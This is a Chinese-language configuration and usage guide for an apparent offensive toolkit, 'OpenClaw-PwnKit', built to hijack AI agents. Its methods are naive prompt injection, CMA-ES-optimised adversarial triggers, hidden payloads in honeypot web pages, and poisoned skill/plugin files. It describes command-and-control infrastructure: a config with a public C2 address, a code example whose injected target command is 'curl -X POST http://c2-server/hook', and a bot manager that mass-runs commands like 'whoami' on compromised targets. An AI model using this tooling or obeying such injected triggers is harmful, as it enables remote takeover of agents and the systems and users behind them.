# OpenClaw-PwnKit 配置与使用指南

## 快速开始

### 计算资源需求(Before Starting)

完整优化运行需要：

- **API 调用**：最多 12,800 次（200 代 × 64 种群）
- **API 成本**：约 50-200 美元（取决于缓存命中率）
- **GPU 内存**：约 6 GB（Phi-2 模型）
    - **Phi-2模型，限制了该项目无法在多数云主机上直接运行**
- **运行时间**：数小时（取决于 API 速率限制）
- **磁盘空间**：约 5 GB（模型权重）
### 安装配置

首先安装项目依赖：

```bash
git clone https://github.com/imbue-bit/OpenClaw-PwnKit.git
cd OpenClaw-PwnKit
conda create -n claw-pwn python=3.11 -y
conda activate claw-pwn
pip install -r requirements.txt
```

如果本地运行，建议使用 Cloudflare Tunnel 暴露服务：

```bash
cloudflared tunnel --protocol http2 --url http://localhost:8000
```

### 配置文件设置

编辑 `config.yaml` 文件配置关键参数：

```yaml
c2_server:
  public_url: "http://64.23.166.214:8000"
  # 以下是我添加的部分，为了适配CliProxyAPI的OpenAI接口
  base_url: "http://localhost:8317/v1/"
  model: "gpt-5.4" 
openai:
  api_key: "env"    # 从 $OPENAI_API_KEY 读取

optimization:
  surrogate_model: "microsoft/phi-2"
  trigger_length: 15
  generations: 200
  population_size: 64
  pca_dimensions: 128
  use_diagonal_cma: true
```

## 使用方法

### 1. 交互式 CLI

启动交互式命令行界面：

```bash
python pwnkit_cli.py
```

CLI 主要命令(`PwnKit提示符`下)：

```bash
set_c2 http://localhost:8000    # 设置 C2 服务器地址
generate honeypot                 # 生成恶意网页
generate skill                    # 生成恶意技能文件
sessions                          # 查看已攻陷的目标
interact <target_id>              # 与目标交互
```

### 2. 编程接口

直接使用 CMA-ES 优化器：

```python
from attacks.method2_cma_es import CMAESTokenOptimizer

optimizer = CMAESTokenOptimizer(
    api_key="sk-...",
    target_script="curl -X POST http://c2-server/hook",
    trigger_len=15,
    pca_dims=128,
)

adversarial_trigger = optimizer.optimize()
print(f"优化后的触发器: {adversarial_trigger}")
```

## 核心组件

### 攻击方法

项目提供四种攻击方法： 

| 方法 | 模块 | 描述 |
|------|------|------|
| 朴素注入 | `attacks/method1_naive.py` | 基线提示注入 |
| CMA-ES 触发器 | `attacks/method2_cma_es.py` | 嵌入空间中的黑盒对抗触发器优化 |
| 蜜罐投递 | `attacks/method3_honeypot.py` | 网页中的隐藏载荷投递 |
| 技能投毒 | `attacks/method4_skills.py` | 恶意技能/插件文件生成 |

### C2 基础设施

- **FastAPI 服务器** (`core/c2_server.py`)：接收 webhook 回调
- **机器人数据库** (`bot_db.py`)：JSON 格式的线程安全存储
- **机器人管理器** (`bot_manager.py`)：批量操作已攻陷目标 [7](#0-6) 

```bash
python bot_manager.py list          # 列出所有机器人
python bot_manager.py mass_cmd -c "whoami"  # 批量执行命令
python bot_manager.py clean         # 清空数据库
```

## 关键参数

| 参数 | 默认值 | 描述 |
|------|--------|------|
| `trigger_len` | 10 | 对抗触发器序列的 token 数量 |
| `pca_dims` | 128 | PCA 降维目标维度 |
| `max_generations` | 200 | CMA-ES 最大迭代代数 |
| `popsize` | 64 | CMA-ES 每代种群大小 |
| `sigma` | 0.5 | CMA-ES 初始步长 | [8](#0-7) 

## Notes

- 首次运行时会自动下载 microsoft/phi-2 模型（约 5 GB）
- CLI 使用 50/50 策略选择 CMA-ES 或朴素攻击，并缓存 CMA-ES 结果以节省 API 费用
- 所有实验应在受控的沙箱环境中进行，请勿用于未授权的系统测试

### Citations

**File:** README.md (L83-88)

```markdown
| Method | Module | Description |
|--------|--------|-------------|
| **CMA-ES Trigger** | `attacks/method2_cma_es.py` | Gradient-free adversarial trigger optimization in embedding space |
| **Naive Injection** | `attacks/method1_naive.py` | Baseline prompt injection via system-override preamble |
| **Honeypot Delivery** | `attacks/method3_honeypot.py` | Hidden payload embedding in web pages for agent web-browsing scenarios |
| **Skill Poisoning** | `attacks/method4_skills.py` | Malicious skill/plugin file generation targeting agent skill-loading mechanisms |
```
